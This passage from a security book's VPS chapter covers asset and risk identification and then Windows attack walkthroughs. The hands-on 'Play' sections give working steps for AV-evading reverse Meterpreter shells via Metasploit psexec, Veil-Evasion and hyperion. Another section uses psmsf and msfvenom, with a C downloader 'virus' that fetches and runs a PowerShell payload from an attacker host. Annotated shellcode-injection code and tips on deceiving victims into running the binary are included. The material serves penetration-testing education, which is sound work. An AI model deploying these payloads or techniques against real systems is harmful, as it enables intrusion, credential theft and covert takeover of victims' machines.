# 7. VPS {#vps}

![10,000' view and lower of VPS Security](images/10000VPS.png)

Most of my work around VPSs are with GNU/Linux instances and when it makes sense for an organisation, I usually advocate that they bring virtual private servers (VPS) [in-house](http://blog.binarymist.net/2014/11/29/journey-to-self-hosting/) as this gives you more control. Most of the testing in this chapter was performed on Debian instances, and usually, but not always, web servers. Unless stated, the following applies to these type of instances.

## 1. SSM Asset Identification {#vps-asset-identification}
Take results from higher level Asset Identification which is found in the 30,000' View chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). Remove any that are not applicable and add any that are newly discovered. Here are some to get you started:

* Ownership. At first this may sound strange as you would likely assume that it is a given that you will always own, or at least have control of your server(s). I am going to dispel this myth. When an attacker wants to compromise your server(s), they will do so for a reason. It may just be for kicks, or it may be for a more sinister reason. They will want an asset that presumably belongs to you, your organisation, or your customers. If they are able to take control of your server(s) (own it, steal it, abuse it, etc.), then they have a foot hold to launch further attacks, or gain control of other assets that do not belong to them. With this in mind, you could think of your server(s) as an asset, also a liability. Both may be correct, either-way, you need to protect your server(s) and ensure a hardened security posture. This is covered under the [SSM Countermeasures](#vps-countermeasures) section looking at HIDS, Logging, and Alerting
* Visibility into and of many things, such as:
  * Disk space
  * Disk IO
  * CPU usage
  * Memory usage
  * File integrity and time stamp changes
  * Which system processes are running
  * System process health and responsiveness
  * Current login sessions, and failed attempts
  * What any user is doing on the system currently
  * Network connections
  * Etc
* Taking the confidential business and client information from the "Starting with the 30,000' view" chapter, we can solidify these concepts into forms such as:
  * Email, Web, Data-store servers and of course the data on them
  * You could even convey this to individuals PCs and other devices which may be carrying this sort of confidential information on them, also mobile devices are a huge risk (see the Mobile chapter of [Fascicle 2](https://leanpub.com/holistic-infosec-for-web-developers-fascicle2-mobile-iot))

More than likely this is an incomplete list for your domain, as I have merely given you a starting point. Use you critical thinking skills and populate the rest, or come back to the process as additional assets enter your mind.

## 2. SSM Identify Risks
Use the same process we did at the top level in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com), but for your VPS(s).

* [MS Host Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_007)
* [MS Securing Your Web Server](https://msdn.microsoft.com/en-us/library/ff648653.aspx) This is Windows specific, but does offer some insight into technology agnostic risks and countermeasures
* [MS Securing Your Application Server](https://msdn.microsoft.com/en-us/library/ff648657.aspx) As above, Microsoft specific, but does provide some ideas for vendor agnostic concepts

### Forfeit Control thus Security {#vps-identify-risks-forfeit-control-thus-security}
![](images/ThreatTags/average-widespread-average-severe.png)

In terms of security, unless your provider is [Swiss](http://www.computerweekly.com/news/2240187513/Is-Switzerland-turning-into-a-cloud-haven-in-the-wake-of-Prism-scandal), you give up a lot when you forfeit your system controls to an external provider. I cover this in my talk ["Does Your Cloud Solution Look Like a Mushroom"](http://blog.binarymist.net/presentations-publications/#does-your-cloud-solution-look-like-a-mushroom).

* If you do not own your VPS(s), you will have limited visibility and control over the infrastructure
* Limited (at the best) visibility into any hardening process your CSP takes. Essentially, you as the saying goes: "Get what you are given"
* Cloud and hosting providers are, in many cases, forced by governments and other agencies to give up your secrets. It is very common now, and you may not even know that it has happened. Swiss providers may be the exception here
* Do you have enough control with your data in the cloud and if it has been compromised, will you actually know about it, and can it invoke your incident response team(s) and procedures?
* Cloud and hosting providers are readily giving up your secrets to government organisations, and to the highest bidders. In many cases you will not know about it
* Your provider may go out of business, and you may get little notice of this
* Providers are often outsourcing their services to several different providers deep. Even they don't have visibility themselves, meaning further control is lost
* Distribution = attack surface. Where is your data? Where are your VM images running from? Further distributed on iSCSI targets? Where are the targets?
* Your provider knows little (at best) about your domain, how you operate, or what you have running on their system(s). How are they supposed to protect you if they have no knowledge of your domain?

### Windows {#vps-identify-risks-Windows}

Windows exploitation is prevalent, easy and fun, because there is what seems to be a never ending source of security defects. I am not going to attempt to cover much, as I would be here for too long, and the focus of this book series is more about giving you a broader understanding with examples as we go.

The problem is less about the defects in Windows, but rather, how the platform was not designed with openness as a core attribute. Because of its closed nature, hardening the platform in many cases is very difficult and it often comes down to applying a band-aid solution over on top of the defects, rather than removing them.

If you want a platform where you can have a decent level of control over its security, do not buy one with closed offerings.

#### PsExec {#vps-identify-risks-psexec}
![](images/ThreatTags/average-common-difficult-severe.png)

PsExec was written by Mark Russinovich as part of the Sysinternals tool suite. The PsExec tool allows you to execute programs on a remote Windows system without having to install anything on the server you want to manage, or hack. It also serves as a [Telnet replacement](https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx).  
PsExec does [require](https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified) a few things on the target system:

1. The Server Message Block (SMB) service must be available and reachable (not blocked by a fire wall for example)
2. File and Print Sharing must be enabled
3. Simple File Sharing must be disabled
4. The Admin$ share (which maps to the Windows directory) must be available and accessible, test it first
5. The credentials supplied to the PsExec utility must have permissions to access the Admin$ share

There are several [behavioural techniques](https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified), or [targets](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md#scenarios) as Metasploit calls them, for the `psexec` module. In this case we use the Native Upload Target, but also use a custom compiled payload (`set exe::custom`); you can see this in The Play below. Our payload is embedded into a Windows Service executable within the PsExec executable, which it then deploys to the Admin$ share on the target machine. The DCE/RPC interface is then used over SMB to access the Windows Service Control Manager (SCM) API. PsExec then turns on its Windows Service on the target machine. This service then creates a named pipe which can be used to send commands to the system.

The Metasploit [`psxec` module](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec) (`exploit/windows/smb/psexec`) uses basically the same principle. This was the first of the "Pass The Hash" suite of Metasploit modules, [first committed](https://github.com/rapid7/metasploit-framework/commits/master/modules/exploits/windows/smb/psexec.rb?after=Y3Vyc29yOk6%2FV6xQayGnXiF%2FSfDmc6XJLm5lKzEwNA%3D%3D) on 2007-07-03

{#wdcnz-demo-5}
![](images/HandsOnHack.png)

The following attack was the last of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-4) of that series will provide some additional context and it is probably best to look at it first if you have not already.

You can find the video of this scenario at [http://youtu.be/1EvwwYiMrV4](http://youtu.be/1EvwwYiMrV4).

I> ## Synopsis
I>
I> This demo differs from the previous in that we do not rely on any of the targets direct interaction. There is no longer a need for the browser.  
I> We open a reverse shell from the victim to us using Metasploit.  
I> We use Veil-Evasion, with the help of hyperion, to encrypt our payload to evade AV.  
I> This attack requires that you obtain the target's username and password, or [password hash](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).  
I> We leverage PsExec, which expects your binary to be a windows service.
I> You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I have not included these steps in this play though, although the video assumes they have been included.

{icon=bomb}
G> ## The Play
G>
G> Start Veil-Evasion:  
G> `cd /opt/Veil/Veil-Evasion/ && ./Veil-Evasion.py`
G>
G> List the available payloads to encrypt:  
G> `list`
G>
G> Choose a service because we are going to use `psexec` to install it on the targets box and we want to open a reverse shell:  
G> `use 4`  
G> That is `c/meterpreter/rev_http_service`
G>
G> Set any options here:  
G> `set lhost <IP address that we are going to be listening on for the reverse shell>`  
G>
G> Generate the initial payload:  
G> `generate`
G>
G> Give it a name. I just selected the default of "payload".  
G> [Enter]  
G> Exit out of Veil-Evasion.
G>
G> `/usr/share/veil-output/compiled/payload[n].exe` needs to be encrypted with hyperion, either on a Windows box or Linux with Wine.  
G> hyperion encrypts with a weak 128-bit AES key, which decrypts itself by brute force at the time of execution. The command to run is:  
G> `hyperion.exe -v payload.exe encrypted-payload.exe`  
G> We then put the encrypted payload somewhere where Metasploit can access it:  
G> I just copied it back to `/usr/share/veil-output/compiled/encrypted-payload.exe`  
G> We then tell Metasploit where we have put it.  
G> I created a Metasploit resource file:  
G> `cat ~/demo.rc`
G>
G> `use exploit/windows/smb/psexec`  
G> `set payload windows/meterpreter/reverse_http`  
G> `set lport 8080`  
G> `set lhost <IP address that we are going to be listening on for the reverse shell>`  
G> `set rhost <IP address of target>`  
G> `set exe::custom /usr/share/veil-output/compiled/encrypted-payload.exe`  
G> `set smbuser <target username>`  
G> `set` [`smbpass`](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md#options) <target password or hash>  
G> `run`
G>
G> The IP addresses and ports need to be the same as you specified when creating the payload using Veil-Evasion.

{icon=bomb}
G> Now we have the credentials from a previous exploit. There are many techniques and tools to help capture these, whether you have physical access or not. We need to acquire the username and password, or hash as they are transmitted across the network for all to see, or easily obtainable if you have physical access to the machine.
G>
G> We now run msfconsole with the resource file as parameter:  
G> `msfconsole -r ~/demo.rc`  
G> This effort is enough to evade AV and obtain our reverse shell.
G>
G> `sessions` will show you the active sessions you have.  
G> To interact with the first one:  
G> `sessions -i 1`
G>
G> The remainder of this play is seen in the [video](https://www.youtube.com/watch?v=1EvwwYiMrV4) that demonstrates creating a new file next to the target's `hosts` file, thus demonstrating full system privileges.

Just before the Synopsis, I mentioned that there were several behavioural techniques for the `psexec` module. One of the other techniques, called "MOF Upload Target" is to use Managed Object Format (MOF) files, which use C++ syntax. These MOF files must be compiled, and are then consumed by Windows Management Instrumentation (WMI). This works quite differently, `psexec` does not execute anything, all it does is upload your executable to `SYSTEM32`, and a MOF file to `SYSTEM32\wbem\mof\`. When windows receives the event for the new MOF file, it compiles and executes it, which tells Windows to run the payload in `SYSTSEM32`. Metasploit's MOF library only works with Windows XP and Server 2003. There is also the high likelihood of being detected by AV, although you can carry out similar tricks as we did above to get around the AV signatures.

If you are running a penetration test for a client and your target's AV fires, then it could be game over for you. There are better options that exist now that are less likely to ring alarm bells with your target.

#### Pass The Hash (PTH) suite of Metasploit Modules {#vps-identify-risks-windows-pth-suite-of-metasploit-modules}
![](images/ThreatTags/average-common-difficult-severe.png)

We have just detailed and demonstrated the first of the Metasploit PTH suite above. Kali Linux also has the "[Pass the Hash toolkit](https://www.kali.org/tutorials/pass-the-hash-toolkit-winexe-updates/)" (all tools are prefixed with "pth-"). The following are the rest of the Metasploit PTH modules in chronological order of their introduction. All of the PTH suite except `psexec_ntdsgrab` depends on [CVE-1999-0504](https://www.cvedetails.com/cve/cve-1999-0504). They also all make use of the PsExec utility, except the last one `wmi`. You will notice that some of these are exploits, and some are technically auxiliary modules. As you read their descriptions, you will understand why.

1. [`current_user_psexec`](https://www.rapid7.com/db/modules/exploit/windows/local/current_user_psexec)  
(2012-08-01) `exploit/windows/local/current_user_psexec`  
"PsExec via Current User Token"  
   
   1. This module uploads an executable file to the victim system, then creates a share containing that executable
   2. It then creates a remote service on each target system similar to the `psexec` module, using a UNC path to the file on the victim system. This is essentially a pivot, or lateral movement
   3. It then starts the service(s) on the target hosts which run the executable from step 1. The reason the service(s) on the target(s) can be placed and run, is because we are using the victim's legitimate current session's authentication token to pivot to the target(s), we do not need to know the credentials for the target(s)  
   
   You are going to want to run `ss` to find out which system(s) if any, the administrator is connected to, ideally something important like a Domain Controller. From the victim, you can compromise many targets using the same administrators authentication token.  
   
   This is a local exploit, and has to be run via an already compromised administrator session that you have Meterpreter connectivity to, for example a reverse shell on your target, from which you will pivot  
   
2. [`psexec_command`](https://www.rapid7.com/db/modules/auxiliary/admin/smb/psexec_command)  
(2012-11-23) `auxiliary/admin/smb/psexec_command`  
"Microsoft Windows Authenticated Administration Utility"  
   
   This module passes the valid administrator credentials, then executes a single arbitrary Windows command on one or more target systems, using a similar technique to the PsExec utility provided by SysInternals. This will not trigger AV as no binaries are uploaded, we are simply leveraging cmd.exe, but nor does it provide a Meterpreter shell. Concatenating commands with '&' does not work  
   
3. [`psexec_loggedin_users`](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/psexec_loggedin_users)  
(2012-12-05) `auxiliary/scanner/smb/psexec_loggedin_users`  
"Microsoft Windows Authenticated Logged In Users Enumeration"  
   
   This module passes the valid administrator credentials, then using a similar technique to that of the PsExec utility, queries the HKU base registry key on the remote machine with reg.exe to get the list of currently logged in users. Notice this is a scanner module, so it can be run against many target machines concurrently  
   
4. [`psexec_psh`](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh)  
(2013-1-21) `exploit/windows/smb/psexec_psh`  
"Microsoft Windows Authenticated Powershell Command Execution"  
   
   This module passes the valid administrator credentials as usual, then attempts to execute a powershell payload using a similar technique to the PsExec utility. This method is far less likely to be detected by AV because PowerShell is native to Windows, each payload is unique because it is your script and it is base64 encoded, more likely to escape signature based detection. It also never gets written to disk and is executed from the commandline using the `-encodedcommand ` flag. It also provides the familiar Meterpreter shell  
   
   * "_A persist option is also provided to execute the payload in a while loop in order to maintain a form of persistence._"
   * "_In the event of a sandbox observing PowerShell execution, a delay and other obfuscation may be added to avoid detection._"
   * "_In order to avoid interactive process notifications for the current user, the PowerShell payload has been reduced in size and wrapped in a PowerShell invocation which hides the window entirely._"  
   
5. [`psexec_ntdsgrab`](https://www.rapid7.com/db/modules/auxiliary/admin/smb/psexec_ntdsgrab)  
(2013-03-15) `auxiliary/admin/smb/psexec_ntdsgrab`  
"PsExec `NTDS.dit` And SYSTEM Hive Download Utility"  
   
   Similar to SmbExec which we set up in the Tooling Setup chapter of Fascicle 0, this Metasploit module authenticates to an Active Directory Domain Controller and creates a volume shadow copy of the %SYSTEMDRIVE% using a native Windows tool "vssadmin" (visible in the [source](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/smb/psexec_ntdsgrab.rb#L55)). It then pulls down copies of the `NTDS.dit` file, as well as the SYSTEM registry hive and stores them. The `NTDS.dit` and SYSTEM registry hive copy can be used in combination with other tools for an offline extraction of AD password hashes. All of this is done without uploading a single binary to the target host.  
   
   There are additional details around where `NTDS.dit` fits into the big picture in the [Windows section](#web-applications-countermeasures-management-of-application-secrets-store-configuration-windows) of the Web Applications chapter.  
   
   Unlike SmbExec, we have to parse the files that `psexec_ntdsgrab` downloads for us with a separate tool, also discussed briefly in the [Windows section](#web-applications-countermeasures-management-of-application-secrets-store-configuration-windows) of the Web Applications chapter  
   
6. [`wmi`](https://www.rapid7.com/db/modules/exploit/windows/local/wmi)  
(2013-09-21) `exploit/windows/local/wmi`  
"Windows Management Instrumentation (WMI) Remote Command Execution"  
   
   Before we cover the Metasploit module, let's gain a little more understanding around what WMI is, when it was introduced, how wide spread its consumption is, etc.  
   
   Windows NT 4.0 (1996-07-29): During this time period, Microsoft released an out-of-band WMI implementation that could be downloaded and installed. Since then, Microsoft has consistently added WMI providers.  
   
   WMI core components are present by default in all Windows OS versions from Windows 2000 and after. Previous Windows releases can run WMI, but the components have to be installed.  
   
   Windows Server 2008 included the minimalistic Server Core, smaller code base, and no GUI (less attack surface).  
   
   Windows Server 2012 added the ability to switch between GUI and Server Core.  
   
   Windows Server 2016 added Nano Server to the mix of options. Nano Server has what is referred to as a minimal footprint, and is headless. It excludes the local GUI, and all management is carried out via WMI, PowerShell, and Remote Server Management Tools (a collection of web-based GUI and command line tools). In Technical Preview 5 (2016-04-17), the ability to manage locally using PowerShell was added. We now see continued commitment to support these tools going forward, however, they will continue to be excellent attack vectors and play an important part in the attackers toolbox and attack surface.  
   
   [WMI Providers](https://msdn.microsoft.com/en-us/library/aa394570(v=vs.85).aspx) provide interfaces for configuring and monitoring Windows services, along with programming interfaces for consumption via custom built tools.  
   
   WMI needs to be accessible for remote access, of which there are step(s) to make sure this is the case. These step(s) vary according to the specific Windows release and other configurations.  
   
   Rather than relying on SMB via the psexec technique, starting a service on the target, the `wmi` module executes PowerShell on the target using the current user credentials, or those that you supply. Therefore this is still a PTH technique. We use the WMI Command-line (WMIC) to [start a Remote Procedure Call](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post/windows/wmic.rb#L48) on TCP port 135 and an ephemeral port, then create a [ReverseListenerComm](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/wmi.rb#L61) to tunnel traffic through that session

#### PowerShell {#vps-identify-risks-powershell}
![](images/ThreatTags/average-common-average-severe.png)

[By default](https://blogs.msdn.microsoft.com/powershell/2008/10/28/powershell-will-be-installed-by-default-on-windows-server-08-r2-ws08r2-and-windows-7-w7/), PowerShell is installed on Windows Server 2008 R2 and Windows 7 onward.

PowerShell "_is going to be on all boxes and is going to provide access to everything on the box_". This is excellent news for penetration testers and other attackers!

On Windows Server, PowerShell 4.0 onwards (Windows 8.1, Server 2012 R2) the default execution policy will be RemoteSigned, but that can be easily overridden in a script, as you will see soon. We:

* Have full direct access to the Win32 API
* Have full access to the .Net framework
* Can assemble malicious shell code in memory without AV detection

Then you will just need to get some code to run on your target's machine. There are many ways to achieve this:

* Find someone that your target trusts and become (pretext) them, services like LinkedIn are good for this, as that will generally allow you to piece the organisation's structure together with freely available OSINT that will not ring any alarm bells. It is pretty easy to build a decent replica of the organisation's trust structure this way. Then you will have implicit trust, they will run your code or open your Office document
* Befriend your target, or someone close to your target inside the targeted organisation and have them run your code as soon as they trust you, then traverse once you have persistence on their machine
* Find someone that usually sends files or links to files via email or similar and spoof the from address as discussed in the People chapter.
* CD, DVD, USB stick drops, etc.
* Using existing credentials that you have obtained by any of the means detailed in the People chapter and maybe logging into Outlook Web Access (OWA) or similar. Most people still use the same or similar passwords for multiple accounts. You only need one of them from someone on the targets network.

Metasploit or the setoolkit generating Office files or PDFs usually trigger AV, but this is much easier to get around with PowerShell.

Traditionally the payload would have to be saved to the targets file system, but with PowerShell and other scripting languages, the payload can remain in memory, this defeats many AV products along with [HIDS/HIPS](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids). AV vendors continue to get better at detecting malware that is compiled to native assembly, but they struggle to interpret the intent of scripts, as it is so easy to make changes to the script, but keep the script intent doing the same thing. To make matters worse, PowerShell is tightly integrated now with the Windows Operating Systems.

What we are ultimately doing is building malware and payloads with chameleon-like characteristics, which look like business as usual (BAU) software, to detection mechanisms.

#### PowerShell Exploitation via Executable C/- [Psmsf](https://github.com/nixawk/psmsf) {#vps-identify-risks-powershell-exploitation-via-executable-psmsf}
![](images/ThreatTags/average-common-average-severe.png)

![](images/HandsOnHack.png)

I> ## Synopsis
I>
I> In this play, we will use `psmsf` to create a Metasploit resource file to configure `msfconsole` onto our attackers system to listen for a reverse tcp shell from our target.  `psmsf` will also leverage  [`msfvenom`](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) to create native Windows shellcode from c. `psmsf` inserts this shellcode into a PowerShell script, then base64 encodes the script. The base64 encoded script is added to a text file prefixed with a PowerShell command which then runs it.
I>
I> We then upload / host the payload generated by `psmsf`.
I> 
I> We then create a small C file (that we call the virus) that downloads and executes the PowerShell payload we have hosted. The C file needs to be compiled on the target platform, and given to our victim to run.
I>
I> Our target runs the virus.  
I> The virus downloads and executes the payload.  
I> The payload runs the base64 encoded script inside it, which spawns a thread and runs immediately from the calling instance of PowerShell, which executes a section of memory that we have over-written with the shellcode. This runs the reverse shell that the attacking machine is listening for.

Meterpreter is an excellent attacker platform. It provides us with many useful tools that make tasks like privilege escalation, establishing persistence, lateral movement, pivoting, and others, much easier.

The shellcodes available in `psmsf` are the following `msfvenom` payloads, of which the second one we use in this play:

* `windows/shell/reverse_tcp`
* `windows/meterpreter/reverse_tcp`
* `windows/meterpreter/reverse_http`

You can find the video of how this attack is played out at [https://youtu.be/a01IJzqYD8I](https://youtu.be/a01IJzqYD8I).

If you do not already have `psmsf` on your attack machine, then go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.

{icon=bomb}
G> ## The Play {#powershell-exploitation-with-psmsf-play}
G>
G> Go ahead and run `python psmsf`, you will be provided with the details you need to take the next steps.
G>
G> Next we run:  
G> `/opt/psmsf$ python psmsf --attacktype ps --payload windows/meterpreter/reverse_tcp --lhost <listener-attack-ip> --lport 4444`
G>
G> If you do not specify an output directory for the attack files that `psmsf` creates, it will create the `powershell_attack` directory in your current directory, then generate the PowerShell attack files for you within it. The two PowerShell attack files are:  
G> 1. `powershell_msf.rc` (the resource file we can feed to `msfconsole`), looks like:  
G> `use exploit/multi/handler`  
G> `set payload windows/meterpreter/reverse_tcp`  
G> `set LHOST <listener-attack-ip>`  
G> `set LPORT 4444`  
G> `set ExitOnSession false`  
G> `set EnableStageEncoding true`  
G> `exploit -j`  
G> 2. `powershell_hacking.bat` (the PowerShell base64 encoded payload with embedded shellcode). This can be [seen below](#powershell_hacking-bat).
G>
G> Start your listener using the `powershell_msf.rc` resource rile:  
G> `msfconsole -r powershell_msf.rc`  
G> or just load the same parameters from the resource file once you have msfconsole running, and follow with: `exploit -j`
G>
G> `msf exploit(handler) > exploit -j`  
G> `[*] Exploit running as background job.`  
G> `[*] Started reverse TCP handler on <listener-attack-ip>:4444`  
G> `[*] Starting the payload handler...`  
G> `msf exploit(handler) >`  
G>
G> The target now needs to run the payload `powershell_hacking.bat`. This can be run anywhere that PowerShell is available, and it will open a reverse meterpreter shell which is embedded within the `powershell_hacking.bat` payload to your listener. Some options:  
G> * Copy paste the contents of the file into a Windows terminal  
G> * Run the file directly: `cmd.exe /c powershell_hacking.bat`

{icon=bomb}
G> Either of these two options are fine if you have access to the target's machine. If not, you will really need to conceal your true intent from the target with whom you have built a trust relationship. We need to hide not only the payload (intent) contents, but also the code (virus) that fetches the payload and runs it (not yet discussed).
G>
G> Host your payload:
G>
G> Copy `powershell_hacking.bat` so our target can unknowingly fetch and run it, you can call it anything, as long as the following commands reference it:  
G> `/opt/psmsf/powershell_attack$ sudo cp powershell_hacking.bat /var/www/html/payload.txt`
G>
G> Start your web server:  
G> `Service apache2 start`  
G> `curl <listener-attack-ip>/payload.txt` or just browse the payload to verify that it is hosted.
G>
G> Now let's create our binary virus, we will write this in C. I am going to call this `download-payload-execute.c` because that is exactly what it does. Obviously you would want to call it something that your target felt comfortable running. This is what it looks like:

{id="download-psmsf-payload-execute", title="download-payload-execute", linenos=off, lang=c}
    #include<stdio.h>
    #include<stdlib.h>
    int main()
    {
      // Once the following line has executed, we will have our shell.
      // system executes any command string you pass it.
      // noprofile causes no profile scripts to be loaded up front.
      // Set executionpolicy to bypass will enable script execution for this session, telling PS
      // to trust that you know what you are doing in downloading -> running scripts.
      // Invoke the EXpression: download the payload and execute it.
      // Providing the payload does not trigger Anti-Virus, this should not.
      system("powershell.exe -noprofile -executionpolicy bypass \"IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))\"");
    
      // Add content here to make your target think this is a legitimate helpful tool.
      // Or just do nothing and you may have to explain to your target that it is broken.
      // Add the following if you want the terminal to stay open.
      //char buff[10];
      //fgets (buff, sizeof(buff), stdin);
    }

{icon=bomb}
G> Neither the payload or the virus should trigger Anti-Virus.
G>
G> You will need a C compiler on a system of the same architecture as your target. I set-up MinGW in the Tooling Setup chapter under Windows, if you followed along you should be able to compile the virus.
G>
G> `gcc download-payload-execute.c -o download-payload-execute.exe`
G>
G> This should provide you with an executable that AV will not detect. You just need to convince your target to run it. When they do, your listener will catch the reverse_tcp shell.
G>
G> Target runs virus. Attacker sees:
G>
G> `[*] Encoded stage with x86/shikata_ga_nai`  
G> `[*] Sending encoded stage (958029 bytes) to <target-ip>`  
G> `[*] Meterpreter session 6 opened (<listener-attack-ip>:4444 -> <target-ip>:63814) at 2016-12-28 15:31:29 +1300`  
G> `msf exploit(handler) >`
G>
G> We now have a shell. Type `sessions` to see its details:
G>
G> `msf exploit(handler) > sessions`
G>
G> `Active sessions`  
G> `===============`  
G>
G> `Id  Type                     Information              Connection`  
G> `--  ----                     -----------              ----------`  
G> `6  meterpreter x86/windows  <target-host>\kim @ <target-host>  <listener-attack-ip>:4444 -> <target-ip>:63814 (<target-ip>)`
G>
G> To interact with your shell:
G>
G> `msf exploit(handler) > sessions -i 6`  
G> `[*] Starting interaction with 6...`
G>
G> `meterpreter >`
G>
G> Check to see which user you are running with, this will be the user that ran the virus. If you convinced your target to run as admin, then you will be able to elevate your privileges very easily (I did not do this in the video demo), otherwise you will have to try one of the other seemingly infinite techniques.
G>
G> `meterpreter > getuid`  
G> `Server username: <target-host>\kim`
G>
G> `meterpreter > pwd`  
G> `C:\Users\kim\Desktop`

{icon=bomb}
G> Check which extensions we have loaded:
G>
G> `meterpreter > use -l`  
G> `espia`  
G> `extapi`  
G> `incognito`  
G> `kiwi`  
G> `lanattacks`  
G> `mimikatz`  
G> `powershell`  
G> `priv`  
G> `python`  
G> `sniffer`  
G> `stdapi`  
G> `winpmem`
G>
G> If `priv` was not in the list, try to load it with `use priv`.  
G> Try for system privileges, if this is not successful, try running `run bypassuac` first:
G>
G> `meterpreter > getsystem -h`  
G> `Usage: getsystem [options]`
G>
G> `Attempt to elevate your privilege to that of local system.`
G>
G> `OPTIONS:`
G>
G> `-h        Help Banner.`  
G> `-t <opt>  The technique to use. (Default to '0').`  
G> `0 : All techniques available`  
G> `1 : Named Pipe Impersonation (In Memory/Admin)`  
G> `2 : Named Pipe Impersonation (Dropper/Admin)`  
G> `3 : Token Duplication (In Memory/Admin)`
G>
G> `meterpreter > getsystem`  
G> `...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).`  
G>
G> `meterpreter > getuid`  
G> `Server username: NT AUTHORITY\SYSTEM`
G>
G> No issue with Anti-Virus at all.  
G> With the easy part done, your next step is to setup persistence, and start moving laterally through the network.

{icon=bomb}
G> `meterpreter > exit`  
G> `[*] Shutting down Meterpreter...`
G>
G> `[*] <target-ip> - Meterpreter session 6 closed.  Reason: User exit`
G>
G> `msf exploit(handler) > jobs -l`
G>
G> `Jobs`  
G> `====`
G>
G> `Id  Name                    Payload                          Payload opts`  
G> `--  ----                    -------                          ------------`  
G> `6   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://<listener-attack-ip>:4444`
G>
G> `msf exploit(handler) > jobs -K`  
G> `Stopping all jobs...`  
G>
G> `msf exploit(handler) > jobs -l`
G>
G> `Jobs`  
G> `====`
G>
G> `No active jobs.`
G>
G> `ss -ant` Will confirm that we are not listening on `4444` any more.

##### PowerShell Payload creation details {#vps-identify-risks-powershell-exploitation-via-executable-psmsf-powershell-payload-creation-details}

When `psmsf` is run as per above, the Metasploit `windows/meterpreter/reverse_tcp` shellcode is generated by running `msfvenom` programmatically as follows:  

{linenos=off, lang=bash}
    msfvenom --payload windows/meterpreter/reverse_tcp LHOST=<listener-ip> LPORT=4444 StagerURILength=5 StagerVerifySSLCert=false --encoder x86/shikata_ga_nai --arch x86 --platform windows --smallest --format c
    # msfvenom --help-formats # Lists all the formats available with description.
    # msfvenom --list encoders # Lists all the encoders available with description.

`psmsf` then takes the generated output and in a function called [`extract_msf_shellcode`](https://github.com/nixawk/psmsf/blob/2e599d5a757ea1540794b46a25825e5317b66fc6/psmsf#L47) strips out the characters that do not actually form part of the raw shellcode, such as an assignment to a char array, double quotes, new lines, semicolons, white space, etc, and just leaves the raw shellcode.

`psmsf` then replaces any instances of `\x` with `0x`.

`psmsf` then passes the cleaned up `reverse_tcp` shellcode to a function called [`generate_powershell_script`](https://github.com/nixawk/psmsf/blob/2e599d5a757ea1540794b46a25825e5317b66fc6/psmsf#L83-L103) that embeds it into a PowerShell script that is going to become the main part of our payload.

That code appears as follows, I have added the annotations to help you understand how it works:


{title="psmsf", linenos=off, lang=python}
    def generate_powershell_script(shellcode):
      shellcode = (
        # Assign a reference to the string that is the C# signature of the VirtualAlloc,
        #   CreateThread, and memset function... to $c.
        # Assign a reference to the string that starts immediately before $c and finishes at
        #   the end of the Start-sleep command... to S1.
        "$1 = '$c = ''"
        # Import the kernel32.dll that has the native VirtualAlloc function we later use
        #   to provide us with the starting position in memory to write our shellcode to.
        "[DllImport(\"kernel32.dll\")]"
        "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);"
        "[DllImport(\"kernel32.dll\")]"
        "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);"
        "[DllImport(\"msvcrt.dll\")]"
        "public static extern IntPtr memset(IntPtr dest, uint src, uint count);"
        "'';"
    
        # Add a VirtualAlloc, CreateThread, and memset functions of the C# signatures we
        #   assigned to $c to the PowerShell session as static methods
        #   of a class that Add-Type is about to create on the fly.
        # Add-Type uses Platform Invoke (P/Invoke) to call the VirtualAlloc, CreateThread,
        #   and memset functions as required from the kernel32.dll.
        # The Name and namespace parameters are used to prefix the new type. passthru is used
        #   to create an object that represents the type which is then assigned to $w
        "$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;"
    
        # Create Byte array and assign our prepped reverse_tcp shellcode.
        "[Byte[]];[Byte[]]"
        "$z = %s;"
        "$g = 0x1000;"
        "if ($z.Length -gt 0x1000){$g = $z.Length};"
    
        # Starting at the first virtual address in the space of the calling process
        #   (which will be a PowerShell instance),
        # allocate 0x1000 bytes, set to zero, but only when a caller first accesses
        #   when we memset below,
        # https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx
        # & set execute, read-only, or read/write access (0x40) to the committed region of pages.
        # https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx
        # Essentially, just allocate some (all permissions) memory at the start of PowerShell
        #   that is executing this & assign the base address of the allocated memory to $x.
    
        "$x=$w::VirtualAlloc(0,0x1000,$g,0x40);"
    
        # Set the memory that $x points to
        #   (first 0x1000 bytes of the calling PowerShell instance) to the memory
        #   that $z points to (the (reverse shell) shellcode that msvenom gives us).
        "for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};"
        # Create a thread to execute within the virtual address space of the calling PowerShell
        #   (which happens on the last line).
        # The third parameter represents the starting address of the thread,
        #   the shellcode to be executed by the thread.
